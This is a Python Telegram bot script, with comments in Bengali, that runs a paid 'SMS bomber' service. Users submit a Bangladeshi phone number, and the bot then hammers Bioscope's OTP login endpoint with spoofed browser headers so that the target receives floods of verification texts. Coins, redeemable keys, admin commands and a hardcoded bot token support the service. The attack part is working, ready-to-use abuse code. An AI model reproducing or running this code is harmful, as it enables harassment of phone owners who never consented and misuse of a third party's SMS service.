import telebot
import requests
import json
import os
import time
import threading
import random
import string
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস ফাংশন ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# ডাটা লোড
users = load_db('users.json')
keys = load_db('keys.json')

# --- লগিং ---
def log_event(text):
    try:
        bot.send_message(LOG_CHANNEL, f"✨ **[System Update]**\n⏰ {datetime.now().strftime('%H:%M:%S')}\n\n{text}")
    except: pass

# --- মেম্বারশিপ চেক ---
def is_subscribed(uid):
    if uid == ADMIN_ID: return True
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, uid).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- ইউজার ম্যানেজমেন্ট ---
def update_user_profile(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active",
            "coins": 100,
            "sent": 0
        }
        save_db('users.json', users)
        log_event(f"🆕 **New User:** {user.first_name} (`{uid}`)")
    return users[uid]

# --- কমান্ডস: User Side ---

@bot.message_handler(commands=['start'])
def start_handler(message):
    uid = str(message.from_user.id)
    u = update_user_profile(message.from_user)

    if not is_subscribed(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Join", callback_data="start_cmd"))
        bot.send_message(message.chat.id, "❌ **Please join our channel first!**", reply_markup=markup)
        return

    if u['status'] == "Blocked":
        bot.send_message(message.chat.id, "🚫 **Access Denied!**\nYou are blocked by the administrator.\nContact: @DarkUnkwon")
        return

    main_menu(message.chat.id, u)

def main_menu(chat_id, u):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🚀 Attack SMS", callback_data="attack")
    btn2 = types.InlineKeyboardButton("👤 My Profile", callback_data="profile")
    btn3 = types.InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")
    btn4 = types.InlineKeyboardButton("⚙️ Support", url="https://t.me/DarkUnkwon")
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_photo(chat_id, LOGO_URL, caption=f"🔥 **Welcome, {u['name']}!**\n\n💰 Coins: `{u['coins']}`\n🏆 Status: `{u['status']}`\n📊 Total Sent: `{u['sent']}`", reply_markup=markup)

# --- এডমিন কন্ট্রোল প্যানেল (১০০% কার্যকর) ---

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    text = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - চেক সিস্টেম ওভারভিউ\n"
        "👥 `/users` - সকল ইউজার লিস্ট\n"
        "⚙️ `/setstatus [ID] [Status]` - (Blocked/Lifetime/Active)\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড\n"
        "🔑 `/gen [Amount]` - রিচার্জ কি জেনারেট\n"
        "📢 `/broadcast [Message]` - সবাইকে মেসেজ"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=['stats'])
def stats_view(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    total_s = sum(u['sent'] for u in users.values())
    bot.reply_to(message, f"📊 **Bot Statistics:**\n\nTotal Users: `{total_u}`\nTotal SMS Sent: `{total_s}`")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID: return
    res = "👥 **User List (Latest):**\n\n"
    for uid, data in list(users.items())[-15:]:
        res += f"ID: `{uid}` | {data['name']} | `{data['status']}`\n"
    bot.reply_to(message, res)

@bot.message_handler(commands=['setstatus'])
def set_status_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, target_id, status = message.text.split()
        if target_id in users:
            users[target_id]['status'] = status
            save_db('users.json', users)
            bot.reply_to(message, f"✅ User `{target_id}` is now `{status}`")
            log_event(f"🛠 Status Change: `{target_id}` -> `{status}`")
        else: bot.reply_to(message, "❌ User ID not found.")
    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Active/Blocked/Lifetime]`")

@bot.message_handler(commands=['addcoins'])
def add_coins_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, target_id, amount = message.text.split()
        if target_id in users:
            users[target_id]['coins'] += int(amount)
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Added `{amount}` coins to `{target_id}`")
        else: bot.reply_to(message, "❌ User ID not found.")
    except: bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")

@bot.message_handler(commands=['gen'])
def gen_key_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.split()[1])
        new_key = "DUMODZ-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        keys[new_key] = amount
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key Generated:**\n`{new_key}`\nValue: `{amount} Coins`")
    except: bot.reply_to(message, "Usage: `/gen [Amount]`")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg_text = message.text.replace("/broadcast ", "")
    count = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **Admin Message:**\n\n{msg_text}")
            count += 1
        except: pass
    bot.reply_to(message, f"✅ Message sent to {count} users.")

# --- এসএমএস ইঞ্জিন (Bioscope logic integrated) ---

@bot.callback_query_handler(func=lambda call: True)
def callback_logic(call):
    uid = str(call.from_user.id)
    if call.data == "attack":
        if users[uid]['status'] == "Blocked":
            bot.answer_callback_query(call.id, "🚫 Blocked!", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_number)
    
    elif call.data == "profile":
        u = users[uid]
        bot.send_message(call.message.chat.id, f"👤 **My Profile:**\nName: {u['name']}\nID: `{uid}`\nCoins: `{u['coins']}`\nSent: `{u['sent']}`\nStatus: `{u['status']}`")
    
    elif call.data == "redeem":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Key:**")
        bot.register_next_step_handler(msg, redeem_key)
    
    elif call.data == "start_cmd":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_handler(call.message)

def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Max 100):**\n_Cost: 5 Coins/SMS_")
        bot.register_next_step_handler(msg, lambda m: start_bomb(m, num))
    else: bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_bomb(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 5
        
        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, "⚠️ **Low Coins! Please use a key or contact admin.**")
            return

        status_msg = bot.send_message(message.chat.id, "🚀 **Attack Starting...**")
        threading.Thread(target=bombing_process, args=(uid, num, amount, cost, status_msg)).start()
    except: bot.send_message(message.chat.id, "❌ Error in amount.")

def bombing_process(uid, num, amount, cost, status_msg):
    success = 0
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    payload = {"number": "+88" + num}
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.116 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/json",
        'origin': "https://www.bioscopeplus.com",
        'referer': "https://www.bioscopeplus.com/"
    }

    for i in range(1, amount + 1):
        try:
            res = requests.post(url, json=payload, headers=headers, timeout=5)
            if res.status_code == 200:
                success += 1
            
            if i % 5 == 0 or i == amount:
                progress = "▰" * (i // 10) + "▱" * (10 - (i // 10))
                bot.edit_message_text(f"🚀 **Attack on {num}**\n\nProgress: `{progress}` {i}/{amount}\n✅ Sent: `{success}`", status_msg.chat.id, status_msg.message_id)
            time.sleep(0.3)
        except: pass

    # ডাটা আপডেট
    if users[uid]['status'] != 'Lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)
    
    log_event(f"🚀 **Attack Finished:**\nUser: {users[uid]['name']}\nTarget: `{num}`\nSuccess: `{success}`")
    
    final_markup = types.InlineKeyboardMarkup()
    final_markup.add(types.InlineKeyboardButton("🚀 New Attack", callback_data="attack"))
    bot.edit_message_text(f"✅ **Attack Summary**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📩 Success: `{success}`\n💰 Coins Remaining: `{users[uid]['coins']}`", status_msg.chat.id, status_msg.message_id, reply_markup=final_markup)

def redeem_key(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        users[uid]['coins'] += val
        del keys[key]
        save_db('users.json', users)
        save_db('keys.json', keys)
        bot.send_message(message.chat.id, f"✅ **Recharge Success!**\n`{val}` coins added to your balance.")
    else: bot.send_message(message.chat.id, "❌ Invalid or Expired Key!")

# --- রান ---
if __name__ == "__main__":
    print("DU ModZ Pro Bot is running...")
    log_event("✅ **Bot is now Online & Fixed!**")
    bot.infinity_polling()
